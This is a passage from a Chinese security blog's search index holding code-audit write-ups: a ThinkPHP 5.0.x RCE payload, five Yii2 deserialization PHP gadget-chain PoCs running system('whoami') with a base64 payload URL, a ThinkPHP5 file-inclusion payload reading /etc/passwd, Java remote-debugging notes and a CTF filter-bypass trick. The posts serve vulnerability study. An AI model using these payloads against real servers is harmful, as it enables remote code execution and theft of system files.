变量覆盖导致的RCE分析","uri":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/#前言"},{"categories":["技术分享"],"content":"环境搭建 composer create-project topthink/think=5.0.5 thinkphp5.0.5 --prefer-dist 修改composer.json \"require\": { \"php\": \"\u003e=5.4.0\", \"topthink/framework\": \"5.0.5\" }, 执行composer update ","date":"2021-11-26","objectID":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP 5.0.x 变量覆盖导致的RCE分析","uri":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/#环境搭建"},{"categories":["技术分享"],"content":"漏洞分析payload: _method=__construct\u0026method=get\u0026filter[]=system\u0026get[]=whoami 在thinkphp/library/think/Request.php中的method方法里面 public function method($method = false) { if (true === $method) { // 获取原始请求类型 return IS_CLI ? 'GET' : (isset($this-\u003eserver['REQUEST_METHOD']) ? $this-\u003eserver['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']); } elseif (!$this-\u003emethod) { if (isset($_POST[Config::get('var_method')])) { $this-\u003emethod = strtoupper($_POST[Config::get('var_method')]); $this-\u003e{$this-\u003emethod}($_POST); } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) { $this-\u003emethod = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']); } else { $this-\u003emethod = IS_CLI ? 'GET' : (isset($this-\u003eserver['REQUEST_METHOD']) ? $this-\u003eserver['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']); } } return $this-\u003emethod; } 看这里的判断，跟进一下config的get方法 if (isset($_POST[Config::get('var_method')])) { $this-\u003emethod = strtoupper($_POST[Config::get('var_method')]); $this-\u003e{$this-\u003emethod}($_POST); 他执行了Config::get('var_method')，把参数var_method给传进去 public static function get($name = null, $range = '') { $range = $range ?: self::$range; // 无参数时获取所有 if (empty($name) \u0026\u0026 isset(self::$config[$range])) { return self::$config[$range]; } if (!strpos($name, '.')) { $name = strtolower($name); return isset(self::$config[$range][$name]) ? self::$config[$range][$name] : null; } else { // 二维数组设置和获取支持 $name = explode('.', $name); $name[0] = strtolower($name[0]); return isset(self::$config[$range][$name[0]][$name[1]]) ? self::$config[$range][$name[0]][$name[1]] : null; } } 返回了一个$config[$range][$name]，即config[_sys_][var_method]，他的值就是_method 所以当我们传入_method=xxx的时候，就可以控制这个$this-\u003e{$this-\u003emethod}($_POST);，从而去执行想要执行的函数 if (isset($_POST[Config::get('var_method')])) { $this-\u003emethod = strtoupper($_POST[Config::get('var_method')]); $this-\u003e{$this-\u003emethod}($_POST); 再看这个类的__construct方法 这个循环会造成一个变量覆盖，而且还是循环的覆盖，可以覆盖很多的值 清楚了漏洞存在的根本原因，接下来我们直接从入口开始分析，public/index.php 再跟进start.php 调用了一个App的run方法 再跟进这个方法，这里检测路由会调用routeCheck方法 // 获取应用调度信息 $dispatch = self::$dispatch; if (empty($dispatch)) { // 进行URL路由检测 $dispatch = self::routeCheck($request, $config); } // 记录当前调度信息 $request-\u003edispatch($dispatch); routeCheck里面调用了Route的check方法 再跟进看到这里调用到了request的method方法 之后就是接上前面分析的request类，传参数_method=__construct进入request类的__construct方法 开始变量的覆盖 filter[]=system get[]=whoami method=GET 再回到check方法，返回return $this-\u003emethod;，由于我们传的参数有一个是method=get，所以变量覆盖后，返回的就是get 如果不做这一步（method=get）返回的就是一些乱七八糟，后续中就可能会出错 再走出去回到app类的run()方法 判断debug，进入分支内，可以看到有一个$request-\u003eparam() 这里vars会被赋值成我们post的数据 这里会执行一个array_merge，合并一下url和post中的参数 先进去get方法，因为我们已经通过变量覆盖为get赋值了，所以不会进入判断条件 再进入input方法，第一个参数传的是$this-\u003eget，这个参数是被我们变量覆盖成whoami的 进去后直接就返回了whoami 出来后param变成了这样，param[0]=whoami 再走到input方法，把param传进去，形参是data 这里再进入filterValue方法，参数继续传下去，data和filter 到这里value就是data，即whoami filter就是filters遍历出来的，之前遍历覆盖成了system 这样就成功的执行了system(“whoami”) ","date":"2021-11-26","objectID":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP 5.0.x 变量覆盖导致的RCE分析","uri":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/#漏洞分析"},{"categories":["技术分享"],"content":"总结不得不佩服大佬的能力，这个rce分析下来个人感觉还是很复杂的，每一个点都被巧妙的利用起来了，太强了太强了orz 画一张图总结一下这里的利用链吧 ","date":"2021-11-26","objectID":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP 5.0.x 变量覆盖导致的RCE分析","uri":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/#总结"},{"categories":["技术分享"],"content":"前言漏洞存在版本\u003c2.0.38 CVE-2020-15148 ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#前言"},{"categories":["技术分享"],"content":"框架搭建直接去github下载，修改好cookie的key，然后就可以访问/web了 ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#框架搭建"},{"categories":["技术分享"],"content":"漏洞分析先看github里作者的提交 可以发现在 framework/db/BatchQueryResult.php 里面添加了_wakeup方法 我们就直奔这里去看了 yii2.0.37/vendor/yiisoft/yii2/db/BatchQueryResult.php 看到这里的__distruct()入口方法 会进去reset方法，但是进去可能就close了，但是这个_dataReader是可以控制的，到时候我们构造poc的时候可以添加析构方法为他赋值！这里$this-\u003e_dataReader就可以触发一个__call方法 全局搜一下__call方法，发现这个类里面有妙处 /vendor/fzaninotto/faker/src/Faker/Generator.php public function format($formatter, $arguments = array()) { return call_user_func_array($this-\u003egetFormatter($formatter), $arguments); } /** * @param string $formatter * * @return Callable */ public function getFormatter($formatter) { if (isset($this-\u003eformatters[$formatter])) { return $this-\u003eformtters[$formatter]; } foreach ($this-\u003eproviders as $provider) { if (method_exists($provider, $formatter)) { $this-\u003eformatters[$formatter] = array($provider, $formatter); return $this-\u003eformatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter)); } /** * @param string $method * @param array $attributes * * @return mixed */ public function __call($method, $attributes) { return $this-\u003eformat($method, $attributes); } 可以发现，__call进去，就直接进format了，而format里面就会直接执行call_user_func_array，跟进一下他的参数 先跟进一下getFormatter，发现这里返回的是formatters，这个参数是我们可控的！ 但是另一个$attributes就不可控了，这里是可以执行一些无参数的函数，但是如果只是调用php原生的那肯定做不了什么事情，我们需要调用yii框架里面自带的无参数方法看看有没有能进一步利用的 继续全局搜索，看看有没有那个无参数方法里面调用了call_user_func 这里是用的正则去搜索，这个正则折腾了好久 function \\w*\\(\\)\\n? *\\{(.*\\n)+ *call_user_func 大概意思就是 function 开头，接着是一段字符接上()后换行，并只匹配0或1次，这里就表示无参数的函数了，但是我们可以更狠一点，直接搜索无参数方法中有call_user_func的，那么就继续加上* \\{匹配前面的表达式0次或多次后加上大括号，然后在call_user_func前面多次匹配上一堆除了换行之外的字符后加上换行：(.*\\n)+ *，最后加上call_user_func 这样就很精准的匹配到无参数方法中有call_user_func函数的方法了 这里找到了一个，简直不要太好打 /vendor/yiisoft/yii2/rest/CreateAction.php public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } 此处省略 } checkAccess和id都是我们可控的！那么这条链子就打通了，我们构造一下poc ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#漏洞分析"},{"categories":["技术分享"],"content":"POC1 \u003c?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'whoami'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters[\"close\"] = [new CreateAction, 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u003e_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?\u003e payload: web?r=test/test\u0026data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6Indob2FtaSI7fWk6MTtzOjM6InJ1biI7fX19fQ== 成功rce 这条链子的总的攻击思路为 1. BatchQueryResult里面__destruct入口函数调用了reset()函数 2. reset()函数内：$this-\u003e_dataReader-\u003eclose();其中_dataReader可控 3. 触发__call方法，找到可利用的call方法：Generator，但是只能执行无参数函数 4. 寻找框架内的可利用的无参数函数，Generator的run 这条链子最后一个寻找无参数可利用函数的时候，还有一个可以利用 ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#poc1"},{"categories":["技术分享"],"content":"POC2 vendor/yiisoft/yii2/rest/IndexAction.php public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } return $this-\u003eprepareDataProvider(); } poc \u003c?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'whoami'; } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters[\"close\"] = [new IndexAction, 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u003e_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?\u003e ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#poc2"},{"categories":["技术分享"],"content":"POC3作者在2.0.38只修复了BatchQueryResult，那么我们能不能再找一个__destruct入口函数去调用call方法，接上后面的链子呢？ 全局搜索__destruct下，找到这个类也可以 /vendor/codeception/codeception/ext/RunProcess.php public function __destruct() { $this-\u003estopProcess(); } public function stopProcess() { foreach (array_reverse($this-\u003eprocesses) as $process) { /** @var $process Process **/ if (!$process-\u003eisRunning()) { continue; } $this-\u003eoutput-\u003edebug('[RunProcess] Stopping ' . $process-\u003egetCommandLine()); $process-\u003estop(); } $this-\u003eprocesses = []; } 可以发现，这里调用了$process-\u003eisRunning()，而且这里的process是可控的！那么我们接上上面的链子就可以继续打 \u003c?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'whoami'; } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters[\"isRunning\"] = [new IndexAction, 'run']; } } } namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct(){ $this-\u003eprocesses[] = new Generator; } } } namespace{ echo base64_encode(serialize(new Codeception\\Extension\\RunProcess)); } ?\u003e ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#poc3"},{"categories":["技术分享"],"content":"POC4不得不说，师傅们太强了，这里还找到了一个链子 在这个文件里面 /vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php public function clearAll($nsKey) { if (array_key_exists($nsKey, $this-\u003ekeys)) { foreach ($this-\u003ekeys[$nsKey] as $itemKey =\u003e $null) { $this-\u003eclearKey($nsKey, $itemKey); } if (is_dir($this-\u003epath.'/'.$nsKey)) { rmdir($this-\u003epath.'/'.$nsKey); } unset($this-\u003ekeys[$nsKey]); } } public function __destruct() { foreach ($this-\u003ekeys as $nsKey =\u003e $null) { $this-\u003eclearAll($nsKey); } } 可以发现，这里进了clearAll后，里面会有一个字符串拼接的操作，而path是我们可控的，那么我们就可以执行__toString方法了，找一下能利用的__toString方法 这里找到了一个这个Cover.php /vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Covers.php 很明显这里可以调用call方法，直接接上去就可以了 poc \u003c?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'whoami'; } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters[\"render\"] = [new IndexAction, 'run']; } } } namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class Cover{ public function __construct(){ $this-\u003edescription=new Generator; } } } namespace{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\Cover; class Swift_KeyCache_DiskKeyCache{ private $path; private $keys = []; public function __construct(){ $this-\u003ekeys=array('aaa'=\u003e'bbb'); $this-\u003epath=new Cover(); } } echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache)); } ?\u003e 成功rce 这些也是可以的，很多很多 ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#poc4"},{"categories":["技术分享"],"content":"POC5除了刚刚的__call方法，其实还有一个思路，就是直接去找能利用的close()方法 在这个文件里面找到能利用的点 /vendor/yiisoft/yii2/web/DbSession.php public function close() { if ($this-\u003egetIsActive()) { // prepare writeCallback fields before session closes $this-\u003efields = $this-\u003ecomposeFields(); YII_DEBUG ? session_write_close() : @session_write_close(); } } 跟进composeFields方法 protected function composeFields($id = null, $data = null) { $fields = $this-\u003ewriteCallback ? call_user_func($this-\u003ewriteCallback, $this) : []; if ($id !== null) { $fields['id'] = $id; } if ($data !== null) { $fields['data'] = $data; } return $fields; } 可以看到这里是有一个call_user_func函数的，而且writeCallback是可控的，那么就可以接上IndexAction的run poc \u003c?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'whoami'; } } } namespace yii\\web{ use yii\\rest\\IndexAction; class DbSession { public $writeCallback; public function __construct(){ $a=new IndexAction(); $this-\u003ewriteCallback=[$a,'run']; } } } namespace yii\\db{ use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct(){ $this-\u003e_dataReader=new DbSession(); } } } namespace{ use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult())); } ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#poc5"},{"categories":["技术分享"],"content":"总结 poc1: BatchQueryResult.__destruct() -\u003e BatchQueryResult.reset() -\u003e Generator.__call() -\u003e Generator.format() -\u003e Generator.getFormatter() -\u003e IndexAction.run() poc2:BatchQueryResult.__destruct() -\u003e BatchQueryResult.reset() -\u003e Generator.__call() -\u003e Generator.format() -\u003e Generator.getFormatter() -\u003e CreateAction.run() poc3: RunProcess.__destruct() -\u003e RunProcess.stopProcess() -\u003e Generator.__call() -\u003e Generator.format() -\u003e Generator.getFormatter() -\u003e CreateAction.run() poc4: Swift_KeyCache_DiskKeyCache.__destruct() -\u003e Swift_KeyCache_DiskKeyCache.clearAll() -\u003e Cover.__toString() -\u003e Cover.render() -\u003e Generator.__call() -\u003e Generator.format() -\u003e Generator.getFormatter() -\u003e CreateAction.run() poc5: BatchQueryResult.__destruct() -\u003e DbSession.close() -\u003e DbSession.composeFields() -\u003e IndexAction.run 大概就分析了这些链，感觉上来说还是不算很难，也是学到了一些代码审计的知识和技巧，那么多条链子，每次成功rce的时候还是很有成就感的 参考链接： https://ego00.blog.csdn.net/article/details/113824239 https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA ","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","series":null,"tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#总结"},{"categories":["CTF"],"content":"漏洞影响范围加载模版解析变量时存在变量覆盖问题，导致文件包含漏洞的产生 漏洞影响版本：5.0.0\u003c=ThinkPHP5\u003c=5.0.18 、5.1.0\u003c=ThinkPHP\u003c=5.1.10 ","date":"2021-11-03","objectID":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP5的文件包含漏洞","uri":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#漏洞影响范围"},{"categories":["CTF"],"content":"tp框架搭建tp框架由两部分组成 应用项目: https://github.com/top-think/think 核心框架: https://github.com/top-think/framework 框架下载好后，需要更名为thinkphp 这里可以直接用composer来获取代码 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.18 tp5.0.18 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \"\u003e=5.6.0\", \"topthink/framework\": \"5.0.18\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： \u003c?php namespace app\\index\\controller; use think\\Controller; class Index extends Controller { public function index() { $this-\u003eassign(request()-\u003eget()); return $this-\u003efetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html } } 创建 application/index/view/index/index.html 文件 ","date":"2021-11-03","objectID":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP5的文件包含漏洞","uri":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#tp框架搭建"},{"categories":["CTF"],"content":"漏洞分析payload： http://127.0.0.1/tp5.0.18/public/index?cacheFile=php://filter/read=convert.base64-encode/resource=/etc/passwd 打断点进行调试 先进入assign进行模板变量的赋值 这边会有一个过滤，看起来像sql的过滤，与我们这次的没啥关系 然后进入fetch方法，走完前面的缓存，就会进入一个read方法 这里进行了一个变量的赋值：extract($vars, EXTR_OVERWRITE);，但是这里他设置了一个属性：EXTR_OVERWRITE 这个属性的存在，会照成一个变量覆盖的效果 这时候，cacheFile就会变成我们get提交的数据 下一步就是直接包含了这个文件 输出读取的文件 成功的包含到了 ","date":"2021-11-03","objectID":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP5的文件包含漏洞","uri":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#漏洞分析"},{"categories":["CTF"],"content":"漏洞总结总体来说，漏洞的思路就是： 先通过view的assign把get数据存在数组data中 然后进入view的fetch方法，通过$vars = array_merge(self::$var, $this-\u003edata, $vars);，将data中的数据再合并到vars的变量中去 再进入了Think的fetch方法，vars变量被赋进去了 再到template的fetch方法中去，data变量依旧继续传递下去 到template的fetch方法里面，里面有一个cacheFile变量，值为箭头所指的文件，到了read方法，data和cacheFile一起被赋值进去 可以看到，这里的extract函数由于EXTR_OVERWRITE设置了参数，所以cacheFile变量被覆盖了，导致后面的include就包含了我们vars中的值，而这个值我们是可以控制的，这就造成了一个文件包含的漏洞 ","date":"2021-11-03","objectID":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP5的文件包含漏洞","uri":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#漏洞总结"},{"categories":["CTF"],"content":"漏洞的修复官方漏洞的修复方案 他这里是用了一个$this-\u003ecacheFile 这样一来，在include的时候就不会因为变量覆盖而包含到我们data中的数据了 public function read($cacheFile, $vars = []) { $this-\u003ecacheFile = $cacheFile; if (!empty($vars) \u0026\u0026 is_array($vars)) { // 模板阵列变量分解成为独立变量 extract($vars, EXTR_OVERWRITE); } //载入模版缓存文件 include $this-\u003ecacheFile; } 这里学长的文章也是提到了为啥参数不换成EXTR_SKIP防止变量的覆盖呢，EXTR_SKIP的作用就是：如果有冲突，不覆盖已有的变量，那么这一步就会失效，万一你确实是想传这么一个$cacheFile=xxx，那么到这里就会直接实效掉，导致功能的损坏，所以利用$this-\u003ecacheFile是更优的选择 ","date":"2021-11-03","objectID":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","series":null,"tags":null,"title":"[代码审计]ThinkPHP5的文件包含漏洞","uri":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#漏洞的修复"},{"categories":["Java"],"content":"Jar包的调试这里以冰蝎做示例 把冰蝎的jar包和他必须的db数据库文件放到项目的lib目录下 把jar包添加到库 如下配置调试配置 新建远程JVM调试 JVM的命令行参数，根据JDK的版本去选择 然后比如在这打一个断点 然后在jar包目录下执行如下命令，后面的参数是刚刚配置调试的那个配置 注意这里，suspend要改成y，不然会卡不住断点，这个参数的意思是：是否等待调试器的接入 回到idea，debug就可以卡住断点了 ","date":"2021-09-18","objectID":"/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/:0:0","series":null,"tags":null,"title":"[Java安全] 远程调试初探","uri":"/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/#jar包的调试"},{"categories":["Java"],"content":"Weblogic的远程调试这里我们是以dacker来配合Idea进行代码调试，使用的是vulhub项目 示例：CVE-2017-10271 在docker-compose.yml里面加上8453端口，这个端口是用于调试的 docker-compose up -d获取镜像并启动后，进入命令行，修改配置文件 在如下路径的setDomainEnv.sh文件中，找到JAVA_DEBUG这里，在下面追加如下代码 enbugFlag=\"true\" export debugFlag 然后执行docker restart xxx命令，重启容器 下一步我们需要把源代码提取到本地 我们需要/root/Oracle/Middleware/下的modules和wlserver_10.3文件 使用cp命令的缺点：操作一些长文件名的时候会报错 推荐使用zip压缩后，cp提取出压缩包 打开idea，将wlserver_10.3/server/lib添加为库 配置调试器，和上面的jar包一样，端口换成8453就行了 ","date":"2021-09-18","objectID":"/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/:0:0","series":null,"tags":null,"title":"[Java安全] 远程调试初探","uri":"/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/#weblogic的远程调试"},{"categories":["Java"],"content":"Tomcat的远程调试以CVE-2017-12615漏洞环境示例 开启5005调试端口，我这里把8080换成了1002，防止端口冲突，本地还是开了挺多服务的 访问1002端口，成功部署 在catalina.sh里面插入如下代码 /usr/local/tomcat/bin/catalina.sh JAVA_OPTS=\"-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005\" 然后重启docker 注意⚠️ ，这里不能直接拿vscode改，重启会报错找不到catalina.sh文件。。。踩坑找了好久才找到原因 用echo写进去就行，也不知道是为啥，希望有了解过的师傅解答一下 下一步就是导出docker里面的lib docker cp 79:/usr/local/tomcat/lib ./ 在idea，创建项目，把lib添加为库 配置调试器还是一样的，端口换成5005 成功卡住 ","date":"2021-09-18","objectID":"/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/:0:0","series":null,"tags":null,"title":"[Java安全] 远程调试初探","uri":"/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/#tomcat的远程调试"},{"categories":["技术分享"],"content":"最近在一道题目里面学到了一个新的小技巧 在php中，字符串是可以递增的，如下： 但是不可递减 这道题是这样的 \u003c?php error_reporting(0); if ($_GET['looklook']){ highlight_file(__FILE__); }else{ setcookie(\"hint\", \"?looklook\", time()+3600); } if (isset($_POST['ctf_show'])) { $ctfshow = $_POST['ctf_show']; if (is_string($ctfshow) || strlen($ctfshow) \u003c= 107) { if (!preg_match(\"/[!@#%^\u0026*:'\\\"|`a-zA-BD-Z~\\\\\\\\]|[4-9]/\",$ctfshow)){ eval($ctfshow); }else{ echo(\"fucccc hacker!!\"); } } } else { phpinfo(); } ?\u003e 可以看到，这里长度的限制是107，我们如果拼接一个_GET，如果硬从C开始自增，那可能会超过限制，T理C太远了，所以这里学到了两个新的操作 在这篇文章有写到（也是原题） $_=C/C ---\u003e NAN $_=1/C ---\u003e INF 但是这不是string类型，但在php里面，我们可以通过拼接一个字符串来让他转成String类型 比如这里我写如下代码 \u003c?php $a = (C/C.C); $b = (1/C.C); var_dump($a); var_dump($b); 成功得到string类型，这里我们就使用索引就可以单选中字母了 这样做就可以从N开始递增了，避开了长度的限制 ","date":"2021-08-19","objectID":"/%E5%88%A9%E7%94%A8php%E7%9A%84nan%E5%92%8Cinf%E6%9D%A5%E8%8E%B7%E5%8F%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9D%A5%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/:0:0","series":null,"tags":null,"title":"利用PHP的NAN和INF来获取字符串来自增绕过长度限制","uri":"/%E5%88%A9%E7%94%A8php%E7%9A%84nan%E5%92%8Cinf%E6%9D%A5%E8%8E%B7%E5%8F%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9D%A5%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/#"},{"categories":null,"content":"关于我","date":"2019-08-02","objectID":"/about/","series":null,"tags":null,"title":"关于我","uri":"/about/"},{"categories":null,"content":"Me: Hello, I am interested in CTF and Penetration A member of the 风信子 major in Web\u0026Misc Contact: Mail: echo MzM2NDc0NDM1NUBxcS5jb20= | base64 --decode 